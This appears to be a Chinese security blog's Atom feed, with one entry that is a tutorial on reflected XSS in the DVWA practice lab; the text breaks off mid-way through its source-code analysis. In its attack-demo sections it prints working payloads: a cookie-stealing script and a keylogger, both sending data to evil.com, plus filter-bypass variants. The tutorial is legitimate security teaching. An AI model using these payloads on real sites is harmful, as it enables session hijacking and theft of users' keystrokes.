@@ -1,0 +1,266 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://bae-ace.github.io</id>
+    <title>bae的博客 • Posts by &#34;xss&#34; tag</title>
+    <link href="https://bae-ace.github.io" />
+    <updated>2025-08-09T13:20:47.000Z</updated>
+    <category term="Web安全" />
+    <category term="Solr" />
+    <category term="XXE" />
+    <category term="漏洞复现" />
+    <category term="Vulhub" />
+    <category term="Kali" />
+    <category term="PWN" />
+    <category term="ELF" />
+    <category term="ROP" />
+    <category term="CTF" />
+    <category term="二进制安全" />
+    <category term="PHP" />
+    <category term="SSRF" />
+    <category term="权限绕过" />
+    <category term="水平越权" />
+    <category term="垂e直越权" />
+    <category term="Pikachu靶场" />
+    <category term="工具" />
+    <category term="sqlmap" />
+    <category term="渗透测试" />
+    <category term="SQL注入" />
+    <category term="网络安全" />
+    <category term="ThinkPHP" />
+    <category term="RCE" />
+    <category term="WebShell" />
+    <category term="蚁剑" />
+    <category term="冰蝎" />
+    <category term="漏洞利用" />
+    <category term="hexo" />
+    <category term="博客搭建" />
+    <category term="初始测试" />
+    <category term="linux" />
+    <category term="命令" />
+    <category term="XSS" />
+    <category term="DVWA" />
+    <category term="反射型XSS" />
+    <category term="安全防护" />
+    <category term="命令执行" />
+    <category term="LFI" />
+    <category term="文件上传" />
+    <category term="信息收集" />
+    <category term="子域名" />
+    <category term="Nginx" />
+    <category term="PHP-FPM" />
+    <category term="Struts2" />
+    <category term="OGNL注入" />
+    <category term="RFI" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/08/09/%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A%E5%9F%BA%E4%BA%8E-DVWA-%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E6%88%98/</id>
+        <title>反射型 XSS 漏洞详解：基于 DVWA 靶场的原理与实战</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/08/09/%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A%E5%9F%BA%E4%BA%8E-DVWA-%E9%9D%B6%E5%9C%BA%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
+        <content type="html">&lt;h1 id=&#34;反射型-XSS-漏洞详解：基于-DVWA-靶场的原理与实战&#34;&gt;&lt;a href=&#34;#反射型-XSS-漏洞详解：基于-DVWA-靶场的原理与实战&#34; class=&#34;headerlink&#34; title=&#34;反射型 XSS 漏洞详解：基于 DVWA 靶场的原理与实战&#34;&gt;&lt;/a&gt;反射型 XSS 漏洞详解：基于 DVWA 靶场的原理与实战&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;跨站脚本攻击（XSS，Cross-Site Scripting）&lt;/strong&gt; 是 Web 应用中最常见的漏洞之一，其中 &lt;strong&gt;反射型 XSS&lt;/strong&gt; 是最基础且常见的类型。它允许攻击者通过构造恶意 URL，在用户浏览器中执行脚本，窃取敏感信息或篡改页面内容。本文基于 &lt;strong&gt;DVWA（Damn Vulnerable Web Application）&lt;/strong&gt; 靶场，详细讲解反射型 XSS 漏洞的原理、利用过程、源码分析及防御措施，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学习目标&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;掌握反射型 XSS 的触发原理和攻击流程&lt;/li&gt;
+&lt;li&gt;学会在 DVWA 靶场复现反射型 XSS&lt;/li&gt;
+&lt;li&gt;理解 XSS 漏洞的危害及防御策略&lt;/li&gt;
+&lt;li&gt;了解反射型 XSS 与其他 XSS 类型的区别&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅限合法授权的渗透测试和安全研究，严禁用于非法攻击！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、什么是-XSS？&#34;&gt;&lt;a href=&#34;#二、什么是-XSS？&#34; class=&#34;headerlink&#34; title=&#34;二、什么是 XSS？&#34;&gt;&lt;/a&gt;二、什么是 XSS？&lt;/h2&gt;&lt;p&gt;XSS（Cross-Site Scripting）是一种代码注入攻击，攻击者通过在 Web 页面中注入恶意脚本（如 JavaScript），使这些脚本在其他用户的浏览器中执行，从而实现窃取 Cookie、篡改页面、钓鱼等恶意行为。&lt;/p&gt;
+&lt;p&gt;XSS 攻击主要分为三类：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;反射型（Reflected XSS）&lt;/strong&gt;：恶意脚本嵌入在 URL 中，通过服务器反射回页面执行。通常发生在 GET 请求中。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;存储型（Stored XSS）&lt;/strong&gt;：恶意脚本存储在服务器（如数据库），当用户访问页面时执行。通常发生在评论、论坛等持久化输入中。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DOM 型（DOM-based XSS）&lt;/strong&gt;：恶意脚本通过前端 JavaScript 操作 DOM 树执行，不经过服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;本文重点讲解 &lt;strong&gt;反射型 XSS&lt;/strong&gt;，因为它是最基础的类型，易于理解和复现。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;反射型 XSS 特点&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击链依赖用户点击恶意 URL。&lt;/li&gt;
+&lt;li&gt;服务器未对用户输入进行过滤或转义，直接输出到页面。&lt;/li&gt;
+&lt;li&gt;常见于搜索框、表单反馈等场景。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、DVWA-靶场介绍&#34;&gt;&lt;a href=&#34;#三、DVWA-靶场介绍&#34; class=&#34;headerlink&#34; title=&#34;三、DVWA 靶场介绍&#34;&gt;&lt;/a&gt;三、DVWA 靶场介绍&lt;/h2&gt;&lt;p&gt;DVWA 是一个开源的漏洞靶场，用于练习 Web 安全漏洞，包括 SQL 注入、XSS、文件上传等。它支持四个安全等级（Low、Medium、High、Impossible），便于逐步学习漏洞利用和防御。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;安装 DVWA&lt;/strong&gt;：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;下载 DVWA：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/digininja/DVWA.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; DVWA&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;配置环境：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;复制到 Web 根目录：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;cp&lt;/span&gt; -r DVWA /var/www/html/dvwa&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;编辑 &lt;code&gt;config/config.inc.php&lt;/code&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_server&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_database&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;dvwa&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_user&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_password&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;your_password&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;启动服务：&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; service apache2 start&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; service mysql start&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;访问靶场：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;http://localhost/dvwa&lt;/code&gt;，完成安装。&lt;/li&gt;
+&lt;li&gt;默认登录：&lt;code&gt;admin&lt;/code&gt; &amp;#x2F; &lt;code&gt;password&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;设置安全等级：&lt;code&gt;Low&lt;/code&gt;（用于测试）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;DVWA 的 XSS (Reflected) 模块模拟了反射型 XSS 漏洞，页面包含一个输入框，用于演示用户输入直接反射到页面。&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、反射型-XSS-漏洞原理&#34;&gt;&lt;a href=&#34;#四、反射型-XSS-漏洞原理&#34; class=&#34;headerlink&#34; title=&#34;四、反射型 XSS 漏洞原理&#34;&gt;&lt;/a&gt;四、反射型 XSS 漏洞原理&lt;/h2&gt;&lt;p&gt;反射型 XSS 的核心在于服务器未对用户输入进行过滤，直接将输入反射到响应页面中，导致浏览器执行恶意脚本。&lt;/p&gt;
+&lt;h3 id=&#34;1-攻击流程&#34;&gt;&lt;a href=&#34;#1-攻击流程&#34; class=&#34;headerlink&#34; title=&#34;1. 攻击流程&#34;&gt;&lt;/a&gt;1. 攻击流程&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;构造恶意 URL&lt;/strong&gt;：攻击者创建带恶意脚本的 URL，例如：&lt;figure class=&#34;highlight xquery&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xquery&#34;&gt;http://target.com/&lt;span class=&#34;hljs-built_in&#34;&gt;?name&lt;/span&gt;=&lt;span class=&#34;language-xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;XSS&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;诱导用户访问&lt;/strong&gt;：通过邮件、社交媒体或短链诱导用户点击。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器响应&lt;/strong&gt;：服务器未过滤输入，直接返回：&lt;figure class=&#34;highlight html&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs html&#34;&gt;Hello &lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;XSS&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;浏览器执行&lt;/strong&gt;：用户浏览器解析页面，执行脚本，弹出警报框。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;2-危害&#34;&gt;&lt;a href=&#34;#2-危害&#34; class=&#34;headerlink&#34; title=&#34;2. 危害&#34;&gt;&lt;/a&gt;2. 危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;窃取 Cookie&lt;/strong&gt;：&lt;code&gt;&amp;lt;script&amp;gt;document.location=&amp;#39;http://evil.com?cookie=&amp;#39;+document.cookie&amp;lt;/script&amp;gt;&lt;/code&gt;，窃取用户会话。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;页面篡改&lt;/strong&gt;：修改页面内容，伪造登录表单。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;键盘记录&lt;/strong&gt;：注入键盘监听脚本，窃取用户输入。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;钓鱼攻击&lt;/strong&gt;：重定向到假页面，诱导用户输入敏感信息。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;浏览器劫持&lt;/strong&gt;：结合其他漏洞，实现持久攻击。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-与其他-XSS-类型的比较&#34;&gt;&lt;a href=&#34;#3-与其他-XSS-类型的比较&#34; class=&#34;headerlink&#34; title=&#34;3. 与其他 XSS 类型的比较&#34;&gt;&lt;/a&gt;3. 与其他 XSS 类型的比较&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;反射型 vs 存储型&lt;/strong&gt;：反射型依赖 URL，一次性攻击；存储型持久存储，影响所有用户。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;反射型 vs DOM 型&lt;/strong&gt;：反射型经过服务器；DOM 型仅前端 JavaScript 处理。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;五、DVWA-靶场实战演示&#34;&gt;&lt;a href=&#34;#五、DVWA-靶场实战演示&#34; class=&#34;headerlink&#34; title=&#34;五、DVWA 靶场实战演示&#34;&gt;&lt;/a&gt;五、DVWA 靶场实战演示&lt;/h2&gt;&lt;h3 id=&#34;1-登录-DVWA&#34;&gt;&lt;a href=&#34;#1-登录-DVWA&#34; class=&#34;headerlink&#34; title=&#34;1. 登录 DVWA&#34;&gt;&lt;/a&gt;1. 登录 DVWA&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;打开浏览器，访问 &lt;code&gt;http://localhost/dvwa&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;输入用户名 &lt;code&gt;admin&lt;/code&gt;，密码 &lt;code&gt;password&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;在左侧导航点击 “DVWA Security”，设置等级为 “Low”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-进入-XSS-Reflected-模块&#34;&gt;&lt;a href=&#34;#2-进入-XSS-Reflected-模块&#34; class=&#34;headerlink&#34; title=&#34;2. 进入 XSS (Reflected) 模块&#34;&gt;&lt;/a&gt;2. 进入 XSS (Reflected) 模块&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;点击左侧导航 “XSS (Reflected)”。&lt;/li&gt;
+&lt;li&gt;页面显示一个输入框：“What’s your name?”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-测试正常输入&#34;&gt;&lt;a href=&#34;#3-测试正常输入&#34; class=&#34;headerlink&#34; title=&#34;3. 测试正常输入&#34;&gt;&lt;/a&gt;3. 测试正常输入&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;输入 “test”，点击提交。&lt;/li&gt;
+&lt;li&gt;页面显示 “Hello test”。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;分析&lt;/strong&gt;：输入直接反射到页面，未过滤。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;4-构造-XSS-Payload&#34;&gt;&lt;a href=&#34;#4-构造-XSS-Payload&#34; class=&#34;headerlink&#34; title=&#34;4. 构造 XSS Payload&#34;&gt;&lt;/a&gt;4. 构造 XSS Payload&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;输入：&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;hljs-title function_&#34;&gt;alert&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;XSS!&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;点击提交。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：页面弹出对话框 “XSS!”。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;5-高级-Payload-测试&#34;&gt;&lt;a href=&#34;#5-高级-Payload-测试&#34; class=&#34;headerlink&#34; title=&#34;5. 高级 Payload 测试&#34;&gt;&lt;/a&gt;5. 高级 Payload 测试&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;窃取 Cookie&lt;/strong&gt;：&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;location&lt;/span&gt;=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;http://evil.com?cookie=&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;cookie&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;浏览器重定向，Cookie 被发送到攻击者服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;键盘记录&lt;/strong&gt;：&lt;figure class=&#34;highlight xml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;language-javascript&#34;&gt;&lt;span class=&#34;hljs-variable language_&#34;&gt;document&lt;/span&gt;.&lt;span class=&#34;hljs-property&#34;&gt;onkeypress&lt;/span&gt;=&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;e&lt;/span&gt;)&amp;#123;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; x=&lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;XMLHttpRequest&lt;/span&gt;();x.&lt;span class=&#34;hljs-title function_&#34;&gt;open&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;GET&amp;quot;&lt;/span&gt;,&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;http://evil.com/log?key=&amp;quot;&lt;/span&gt;+e.&lt;span class=&#34;hljs-property&#34;&gt;key&lt;/span&gt;);x.&lt;span class=&#34;hljs-title function_&#34;&gt;send&lt;/span&gt;();&amp;#125;&lt;/span&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;/&lt;span class=&#34;hljs-name&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;记录用户按键，发送到攻击者服务器。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;使用 Burp Suite 测试&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;拦截请求，修改 &lt;code&gt;name&lt;/code&gt; 参数为恶意 Payload。&lt;/li&gt;
+&lt;li&gt;发送，观察响应中是否执行脚本。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;6-不同安全等级测试&#34;&gt;&lt;a href=&#34;#6-不同安全等级测试&#34; class=&#34;headerlink&#34; title=&#34;6. 不同安全等级测试&#34;&gt;&lt;/a&gt;6. 不同安全等级测试&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Medium&lt;/strong&gt;：可能过滤 &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;，尝试绕过如 &lt;code&gt;&amp;lt;img src=x onerror=alert(&amp;#39;XSS&amp;#39;)&amp;gt;&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;High&lt;/strong&gt;：加强过滤，使用更复杂的 Payload 如 &lt;code&gt;&amp;lt;svg onload=alert(&amp;#39;XSS&amp;#39;)&amp;gt;&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Impossible&lt;/strong&gt;：使用白名单或转义，无法利用。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;六、源码分析与漏洞原因&#34;&gt;&lt;a href=&#34;#六、源码分析与漏洞原因&#34; class=&#34;headerlink&#34; title=&#34;六、源码分析与漏洞原因&#34;&gt;&lt;/a&gt;六、源码分析与漏洞原因&lt;/h2&gt;&lt;p&gt;DVWA Low 等级的反射型 XSS 源码（&lt;code&gt;vulnerabilities/xss_r/source/low.php&lt;/code&gt;）：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;header&lt;/span&gt; (&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;X-XSS-Protection: 0&amp;quot;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// Is there any input?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;( &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;array_key_exists&lt;/span&gt;( &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;name&amp;quot;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt; ) &amp;amp;&amp;amp; &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[ &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt; ] != &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt; ) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;// Feedback for end user&lt;/span&gt;&lt;br&gt;    &lt;span 